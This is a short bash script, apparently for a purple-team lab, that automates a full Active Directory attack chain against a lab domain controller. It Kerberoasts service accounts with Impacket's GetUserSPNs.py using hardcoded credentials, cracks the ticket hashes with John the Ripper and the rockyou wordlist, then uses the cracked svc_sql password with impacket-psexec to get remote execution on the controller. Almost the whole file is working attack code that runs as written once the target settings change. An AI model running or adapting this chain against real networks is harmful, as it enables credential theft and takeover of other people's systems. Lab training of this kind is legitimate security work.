#!/bin/bash
# ============================================================
# Full Attack Chain
# ============================================================
# Description: Runs the complete attack chain:
#   1. Kerberoasting
#   2. Hash cracking
#   3. Lateral movement
# ============================================================

set -e

# ---- Configuration ----
DC_IP="192.168.100.10"
DOMAIN="lab.local"
USER="user1"
PASS="User@1234"
HASH_FILE="kerberoast_hash.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ---- Colors ----
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${CYAN}"
echo "============================================="
echo "     FULL ATTACK CHAIN - PURPLE TEAM LAB     "
echo "============================================="
echo -e "${NC}"

# ---- Step 1: Kerberoasting ----
echo -e "${CYAN}[*] Step 1: Kerberoasting${NC}"
GetUserSPNs.py ${DOMAIN}/${USER}:${PASS} -dc-ip ${DC_IP} -request -outputfile ${HASH_FILE}

# ---- Step 2: Cracking ----
echo -e "${CYAN}[*] Step 2: Cracking hash${NC}"
john --wordlist=${WORDLIST} ${HASH_FILE}

# ---- Step 3: Extract cracked password ----
PASSWORD=$(john --show ${HASH_FILE} | cut -d: -f2 | head -1)

if [ -z "${PASSWORD}" ]; then
    echo -e "${RED}[!] Password not cracked.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Cracked password: ${PASSWORD}${NC}"

# ---- Step 4: Lateral movement ----
echo -e "${CYAN}[*] Step 3: Lateral movement${NC}"
impacket-psexec ${DOMAIN}/svc_sql:${PASSWORD}@${DC_IP}

echo -e "${GREEN}[+] Full attack chain complete.${NC}"
